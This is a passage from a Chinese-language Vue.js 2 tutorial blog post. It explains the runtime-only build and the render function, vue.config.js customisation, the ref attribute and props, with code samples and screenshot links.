class="hljs-string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 图标：配置页签图标，不在使用./或者../，而是使用&lt;%= BASE_URL %&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 配置网页的标题：将package.json中的name作为网站的标题，由webpackage中的插件实现 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&lt;%= htmlWebpackPlugin.options.title %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- noscript：如果页面不支持js，那么标签内容将在页面展示，可以在浏览器中禁用js，就能达到测试目的 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- built files will be auto injected --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>  <br></code></pre></td></tr></table></figure>

![image-20210916133026852](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916133026852.png)
</code></pre>
</li>
</ul>
<h3 id="3-3-render函数"><a href="#3-3-render函数" class="headerlink" title="3.3 render函数"></a>3.3 render函数</h3><p>讲解：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">render: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> h(App) <span class="hljs-comment">// 功能：将App组件放入容器中</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916155515684.png" srcset="/img/loading.gif" lazyload alt="image-20210916155515684" style="zoom:80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916155444188.png" srcset="/img/loading.gif" lazyload alt="image-20210916155444188"></p>
<p>说明不能用红框代码替换<code>render : h =&gt; h(App)</code>，因为当前使用的是运行时版本的<code>Vue</code>，没有模板解析器（即引入的是一个残缺的模板解析器），解决方案：要么把需要编译的模板交给<code>render</code>函数，要么使用包含编译器的版本。</p>
<h4 id="解决方案一"><a href="#解决方案一" class="headerlink" title="解决方案一"></a>解决方案一</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916184913214.png" srcset="/img/loading.gif" lazyload alt="image-20210916184913214" style="zoom: 67%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916200713633.png" srcset="/img/loading.gif" lazyload alt="image-20210916200713633" style="zoom:80%;" />

<p>专门控制<code>es6</code>模块化引入<code>Vue</code>时到底是哪一个<code>Vue.js</code>，这里的<code>vue.runtime.esm.js</code>是一个残缺/精简版（缺少模板解析器）的<code>Vue</code>。</p>
<p>验证：</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916201441373.png" srcset="/img/loading.gif" lazyload alt="image-20210916201441373" style="zoom:80%;" />控制台输出了<code>66666</code>，确实是调用了<code>vue.runtime.esm.js</code>，所以我们尝试引入完整版的<code>vue</code>以便解决问题：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916201923086.png" srcset="/img/loading.gif" lazyload alt="image-20210916201923086" style="zoom:80%;" />

<p>修改后，页面加载显示正常。</p>
<h4 id="解决方案二"><a href="#解决方案二" class="headerlink" title="解决方案二"></a>解决方案二</h4><p>由于引入残缺版的<code>vue</code>，要想配置具体的内容，就不能再写<code>template</code></p>
<p>这里可以使用<code>render</code>解决：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">render</span>(<span class="hljs-params">a</span>)</span>&#123;<br>	函数内容;<br>	返回值; <span class="hljs-comment">// 返回值必须要有！</span><br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a) <span class="hljs-comment">// function</span><br>&#125;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916202853310.png" srcset="/img/loading.gif" lazyload alt="image-20210916202853310" style="zoom:80%;" />

<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916203131932.png" srcset="/img/loading.gif" lazyload alt="image-20210916203131932" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916203148520.png" srcset="/img/loading.gif" lazyload alt="image-20210916203148520" style="zoom:80%;" />

<p>render用于当引入残缺版的<code>vue</code>时，还想配置具体的内容，就得借助<code>render</code>函数（由<code>vue</code>调用）。</p>
<p>简写后：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916203631945.png" srcset="/img/loading.gif" lazyload alt="image-20210916203631945" style="zoom:80%;" />

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">render: <span class="hljs-function">(<span class="hljs-params">h</span>) =&gt;</span> h(<span class="hljs-string">&#x27;h1&#x27;</span>, <span class="hljs-string">&#x27;你好哇&#x27;</span>) <span class="hljs-comment">// 传参： html内置元素, 内容</span><br></code></pre></td></tr></table></figure>

<p>当传入的参数是组件：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">render: <span class="hljs-function">(<span class="hljs-params">h</span>) =&gt;</span> h(App)<br><span class="hljs-comment">// 错误写法：render: (h) =&gt; h(&#x27;App&#x27;)</span><br><span class="hljs-comment">// 上述写法是创建一个html里的App元素，而不是渲染组件</span><br></code></pre></td></tr></table></figure>

<h4 id="使用裁剪版Vue的原因"><a href="#使用裁剪版Vue的原因" class="headerlink" title="使用裁剪版Vue的原因"></a>使用裁剪版Vue的原因</h4><p>vue =&gt; vue核心 + vue模板解析器</p>
<p><code>vue.js</code>模板解析器几乎占用了<code>vue</code>三分之一的体积，如果不开发精简版的<code>vue</code>，就会出现问题：项目完成后，最终<code>webpack</code>打包后一定包含<code>vue</code>库，那么就一定有模板解析器。开发时，模板解析器帮助我们翻译模板；但是最后借助<code>webpack</code>，已经能把<code>.vue</code>给翻译成<code>.js</code>文件，而且该解析的模板都解析完成，已经变成浏览器认识的三件套了，此时模板解析器就多余了，使用裁剪版可以让打包出来的文件体积变小。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916204358861.png" srcset="/img/loading.gif" lazyload alt="image-20210916204358861" style="zoom:80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916205216079.png" srcset="/img/loading.gif" lazyload alt="image-20210916205216079"></p>
<p><code>esm</code>：<code>es</code>代表ES6模块化，<code>m</code>代表模块；即：使用ES6进行模块化引入，使用该版本的<code>vue</code></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916205835169.png" srcset="/img/loading.gif" lazyload alt="image-20210916205835169" style="zoom: 80%;" />

<p>对于组件(.vue文件)标签中的<code>template</code>能够被解析：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916210624705.png" srcset="/img/loading.gif" lazyload alt="image-20210916210624705" style="zoom:80%;" />

<p>而<code>vm</code>中没人解析，所以不能写<code>template</code>标签。</p>
<p>要在浏览器中运行一个精简版的<code>vue</code>，需要使用<code>vue.runtime.js</code>/<code>vue.runtime.min.js</code></p>
<h4 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h4><ul>
<li>不同版本的<code>vue.js</code>：<ul>
<li><code>vue.js</code>是完整版的<code>Vue</code>，包含：核心功能 + 模板解析器</li>
<li><code>vue.runtime.xxx.js</code>是运行时版本的<code>js</code>，只包含：核心功能，没有模板解析器</li>
</ul>
</li>
<li>因为<code>vue.runtime.xxx.js</code>没有模板解析器，所以不能使用<code>template</code>配置项，需要使用<code>render</code>函数接收<code>createElement</code>函数去指定具体的内容。</li>
</ul>
<h3 id="3-4-修改默认配置"><a href="#3-4-修改默认配置" class="headerlink" title="3.4 修改默认配置"></a>3.4 修改默认配置</h3><p><code>Vue</code>入口文件默认为<code>main.js</code>，修改名称后，<code>Vue</code>找不到入口文件，就会报错。</p>
<p>脚手架依托于<code>Webpack</code>，而<code>webpack</code>有配置文件<code>webpack.config.js</code>。为了防止配置文件被破坏，所以<code>Vue</code>脚手架中默认隐藏了所有<code>webpack</code>相关的配置文件。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">// 查看默认<br>vue inspect &gt; output.js<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922153212627.png" srcset="/img/loading.gif" lazyload alt="image-20210922153212627" style="zoom:80%;" />

<p>报错，可能的解决方案：<a href="https://blog.csdn.net/weixin_35773751/article/details/104415617">CSDN</a></p>
<p>注意：<code>output.js</code>只是输出一下，不是说更改后脚手架会跟着配置变化</p>
<p>可以更改的配置项参考：<a href="https://cli.vuejs.org/zh/config/#%E5%85%A8%E5%B1%80-cli-%E9%85%8D%E7%BD%AE">配置参考 | Vue CLI (vuejs.org)</a></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922153934140.png" srcset="/img/loading.gif" lazyload alt="image-20210922153934140"></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922154204233.png" srcset="/img/loading.gif" lazyload alt="image-20210922154204233"></p>
<p>上述二者没有任何关系，一个是往<code>vue</code>构造函数上的某一个属性里添加/修改/删除属性，用于调整<code>vue</code>库工作方式；<code>vue.config.js</code>是调整脚手架的工作模式的。</p>
<p>一个样例：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">module</span>.exports = &#123;<br>    pages: &#123;<br>      index: &#123;<br>        <span class="hljs-comment">// page 的入口</span><br>        entry: <span class="hljs-string">&#x27;src/index/main.js&#x27;</span>,<br>        <span class="hljs-comment">// 模板来源</span><br>        template: <span class="hljs-string">&#x27;public/index.html&#x27;</span>,<br>        <span class="hljs-comment">// 在 dist/index.html 的输出</span><br>        filename: <span class="hljs-string">&#x27;index.html&#x27;</span>,<br>        <span class="hljs-comment">// 当使用 title 选项时，</span><br>        <span class="hljs-comment">// template 中的 title 标签需要是 &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;</span><br>        title: <span class="hljs-string">&#x27;Index Page&#x27;</span>,<br>        <span class="hljs-comment">// 在这个页面中包含的块，默认情况下会包含</span><br>        <span class="hljs-comment">// 提取出来的通用 chunk 和 vendor chunk。</span><br>        chunks: [<span class="hljs-string">&#x27;chunk-vendors&#x27;</span>, <span class="hljs-string">&#x27;chunk-common&#x27;</span>, <span class="hljs-string">&#x27;index&#x27;</span>]<br>      &#125;,<br>      <span class="hljs-comment">// 当使用只有入口的字符串格式时，</span><br>      <span class="hljs-comment">// 模板会被推导为 `public/subpage.html`</span><br>      <span class="hljs-comment">// 并且如果找不到的话，就回退到 `public/index.html`。</span><br>      <span class="hljs-comment">// 输出文件名会被推导为 `subpage.html`。</span><br>      subpage: <span class="hljs-string">&#x27;src/subpage/main.js&#x27;</span><br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>此处使用<code>common.js</code>暴露，<code>Vue</code>将<code>vue.config.js</code>输送给<code>webpack</code>，而<code>webpack</code>基于<code>node.js</code>，而<code>node.js</code>采用的模块化是<code>common.js</code>。</p>
<p>脚手架将写完的<code>vue.config.js</code>中所有的配置提取出来，和<code>webpack</code>中写好的配置进行一个合并。而不是直接给出核心配置文件，即使出了问题，删除了<code>vue.config.js</code>，还可以继续采用默认配置，而不会出现永久破坏性更改。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">module</span>.exports = &#123;<br>    pages: &#123;<br>      index: &#123;<br>        <span class="hljs-comment">// page 的入口</span><br>        entry: <span class="hljs-string">&#x27;src/zhulan.js&#x27;</span>,<br>      &#125;,<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>此时对于更改<code>main.js</code>名称的项目，运行不会报错</p>
<p>注意：修改<code>vue.config,js</code>后，要使之生效，应该要重启服务器</p>
<p>配置项为空是不行的：<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922155837928.png" srcset="/img/loading.gif" lazyload alt="image-20210922155837928" style="zoom:80%;" /></p>
<p>报错：<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922155919851.png" srcset="/img/loading.gif" lazyload alt="image-20210922155919851" style="zoom:80%;" /></p>
<p>默认启动了语法检查，在<code>main.js</code>中声明了一个变量，但是没有使用，项目会报错，无法启动：</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922160331057.png" srcset="/img/loading.gif" lazyload alt="image-20210922160331057"></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922160712256.png" srcset="/img/loading.gif" lazyload alt="image-20210922160712256"></p>
<p>语法检查：<code>eslint</code>、<code>jslint</code>、<code>jshint</code></p>
<hr>
<p>使用配置项关闭语法检查：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922161049459.png" srcset="/img/loading.gif" lazyload alt="image-20210922161049459" style="zoom: 80%;" />

<p>此时项目可以正常启动</p>
<h4 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h4><ul>
<li>使用<code>vue inspect &gt; output.js</code>可以查看到脚手架默认的配置</li>
<li>使用<code>vue.config.js</code>可以对脚手架进行个性化定制，详情见<code>VUE CLI</code>官网</li>
</ul>
<h3 id="3-5-ref属性"><a href="#3-5-ref属性" class="headerlink" title="3.5 ref属性"></a>3.5 ref属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;h1 v-text&#x3D;&quot;msg&quot; ref&#x3D;&quot;title&quot;&gt;&lt;&#x2F;h1&gt;<br>    &lt;button @click&#x3D;&quot;showDOM&quot;&gt;点我输出上方的DOM元素&lt;&#x2F;button&gt;<br>    &lt;Student &#x2F;&gt;<br>    &lt;School&gt;&lt;&#x2F;School&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 引入组件<br>import School from &quot;.&#x2F;components&#x2F;School&quot;;<br>import Student from &quot;.&#x2F;components&#x2F;Student&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; Student, School &#125;,<br>  data() &#123;<br>    return &#123;<br>      msg: &quot;你好呀,zhul&quot;,<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    showDOM() &#123;<br>      console.log(this);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922194913308.png" srcset="/img/loading.gif" lazyload alt="image-20210922194913308"></p>
<p><code>ref</code>属性可以理解为<code>id</code>的替代品。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195250243.png" srcset="/img/loading.gif" lazyload alt="image-20210922195250243" style="zoom:80%;" />

<p>在组件标签上加<code>ref</code>属性：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195416008.png" srcset="/img/loading.gif" lazyload alt="image-20210922195416008" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195445816.png" srcset="/img/loading.gif" lazyload alt="image-20210922195445816" style="zoom:80%;" />

<p>此处输出的是组件实例对象：</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195727192.png" srcset="/img/loading.gif" lazyload alt="image-20210922195727192"></p>
<hr>
<p>如果给组件标签加上<code>id</code>属性：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195936919.png" srcset="/img/loading.gif" lazyload alt="image-20210922195936919" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922200047547.png" srcset="/img/loading.gif" lazyload alt="image-20210922200047547" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922200028275.png" srcset="/img/loading.gif" lazyload alt="image-20210922200028275" style="zoom:80%;" />

<h4 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h4><ul>
<li><code>ref</code>属性：<ul>
<li>被用来给元素或子组件注册（id的替代者）</li>
<li>应用在<code>html</code>标签上获取的是真实的DOM元素，应用在组件标签上是组件实例对象(vc)</li>
<li>使用方式<ul>
<li>打标识：<code>&lt;h1 ref =&quot;xxx&quot;&gt;……&lt;/h1&gt;</code>或<code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li>
<li>获取：<code>this.$refs.xxx</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-6-props配置"><a href="#3-6-props配置" class="headerlink" title="3.6 props配置"></a>3.6 props配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;Student &#x2F;&gt;<br>    &lt;hr &#x2F;&gt;<br>    &lt;Student &#x2F;&gt;<br>    &lt;hr &#x2F;&gt;<br>    &lt;Student &#x2F;&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 引入组件<br>import Student from &quot;.&#x2F;components&#x2F;Student&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; Student &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/54.gif" srcset="/img/loading.gif" lazyload alt="54" style="zoom:80%;" />

<p>不难发现，它们三个是独立的三个<code>Vc</code>，之间是互不影响的。</p>
<hr>
<p><code>App.vue</code>（付款方）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;Student myname&#x3D;&quot;张加林&quot; myage&#x3D;&quot;20&quot; &#x2F;&gt;<br>    &lt;hr &#x2F;&gt;<br>    &lt;Student myname&#x3D;&quot;李顺&quot; myage&#x3D;&quot;21&quot; &#x2F;&gt;<br>    &lt;hr &#x2F;&gt;<br>    &lt;Student myname&#x3D;&quot;李嘉亮&quot; myage&#x3D;&quot;21&quot; &#x2F;&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 引入组件<br>import Student from &quot;.&#x2F;components&#x2F;Student&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; Student &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><code>Student.vue</code>（收款方）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h1&gt;<br>    &lt;h2 class&#x3D;&quot;name&quot;&gt;姓名:&#123;&#123; myname &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2 class&#x3D;&quot;age&quot;&gt;年龄:&#123;&#123; myage &#125;&#125;&lt;&#x2F;h2&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>    &lt;script&gt;<br>export default &#123;<br>  name: &quot;School&quot;,<br>  data() &#123;<br>    return &#123;<br>      msg: &quot;你好呀,zhul&quot;,<br>    &#125;;<br>  &#125;,<br>  props: [&quot;myname&quot;, &quot;myage&quot;],<br>&#125;;<br>&lt;&#x2F;script&gt;<br><br>    &lt;style&gt;<br>.age &#123;<br>  color: #8080ff;<br>&#125;<br><br>.name &#123;<br>  color: #2030ff;<br>  background-color: #999;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p>需求：要求每个人的展示年龄比实际年龄大1岁。</p>
<p>一种错误的实现方式：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922203607771.png" srcset="/img/loading.gif" lazyload alt="image-20210922203607771" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922203709444.png" srcset="/img/loading.gif" lazyload alt="image-20210922203709444" style="zoom:50%;" />

<p>错误原因：props传入的是字符串类型。</p>
<p>props传入的参数最终会被保存在<code>vc</code>上：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922204351765.png" srcset="/img/loading.gif" lazyload alt="image-20210922204351765" style="zoom: 80%;" />

<p>在开发者工具上可以清楚的区分是外部传入的，还是由<code>data</code>项配置的：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922204453305.png" srcset="/img/loading.gif" lazyload alt="image-20210922204453305" style="zoom:80%;" />

<p>一种可行的解决方案（不是最佳的）：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922204842412.png" srcset="/img/loading.gif" lazyload alt="image-20210922204842412" style="zoom:80%;" />

<p>最佳解决方案：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922204931655.png" srcset="/img/loading.gif" lazyload alt="image-20210922204931655" style="zoom:80%;" />

<p>解析：<code>:</code>代表使用<code>v-bind</code>，使用动态绑定，<code>myage</code>传值，<code>myage</code>的值是运行引号中JS表达式的结果，不加冒号无论如何传的都是字符串。</p>
<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922205903733.png" srcset="/img/loading.gif" lazyload alt="image-20210922205903733" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922210026139.png" srcset="/img/loading.gif" lazyload alt="image-20210922210026139" style="zoom:80%;" />

<p>上述方法可以限制传入的数据类型，现在测试前面错误的传值方式：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922205756937.png" srcset="/img/loading.gif" lazyload alt="image-20210922205756937" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922210620929.png" srcset="/img/loading.gif" lazyload alt="image-20210922210620929" style="zoom:80%;" />

<hr>
<p>注意：接收到的<code>props</code>是不允许更改的。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateAge&quot;</span>&gt;</span>尝试修改传入的年龄<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>/******************************/<br>methods: &#123;<br>   updateAge() &#123;<br>     this.age = 999;<br>   &#125;<br> &#125;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922223619270.png" srcset="/img/loading.gif" lazyload alt="image-20210922223619270" style="zoom:80%;" />

<p>虽然会报错，但是更改还是会起作用。</p>
<hr>
<p>推荐的修改<code>props</code>的方法：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922224402039.png" srcset="/img/loading.gif" lazyload alt="image-20210922224402039" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922224422262.png" srcset="/img/loading.gif" lazyload alt="image-20210922224422262" style="zoom:80%;" />

<p><code>props</code>中的属性优先被接收，放在<code>vc</code>上，所以才能读取<code>this.myname / this.age</code></p>
<h4 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h4><p>配置项<code>props</code>：</p>
<ul>
<li><p>功能：让组件接收外部传入的数据</p>
<ul>
<li><p>传递数据：</p>
<ul>
<li><pre><code class="html">&lt;Demo name=&quot;xxxx&quot;/&gt;
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>* 接收数据：<br><br>  * 第一种方式（只接收）：<br><br>    ```js<br><span class="hljs-title">    props:</span>[&#x27;name&#x27;]<br></code></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>第二种方式（限制类型）：</p>
